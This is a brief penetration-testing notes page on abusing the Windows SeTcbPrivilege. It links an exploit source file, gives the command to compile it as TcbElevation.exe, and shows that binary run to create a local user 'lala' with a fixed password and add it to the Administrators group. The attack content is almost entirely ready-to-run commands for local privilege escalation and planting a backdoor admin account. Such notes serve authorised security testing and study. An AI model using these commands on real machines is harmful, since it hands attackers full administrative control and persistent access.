---
title: SeTcbPrivilege
author: amandaguglieri
draft: false
TableOfContents: true
tags:
  - pentesting
  - windows
  - privilege
  - SeBackupPrivilege
---
# SeTcbPrivilege

Resources: https://adminions.ca/books/windows-attacks-and-enumerations/page/windows-local-privilege-escalation


## TcbElevation.cpp

Original source: https://gist.github.com/antonioCoco/19563adef860614b56d010d92e67d178

My refined version ( Visual Studio 2022): 


```powershell
cl /nologo /EHsc /FeTcbElevation.exe .\TcbElevate.cpp /DUNICODE /D_UNICODE /link Advapi32.lib ntdll.lib
```

The tester executed 'TcbElevation.exe' to create a new local user lala with password 'lala123' and add it to the Administrators group:

```powershell
.\TcbElevation.exe nonexistentservice "C:\Windows\System32\cmd.exe /c net user lala lala123 /add && net localgroup administrators lala /add"
```
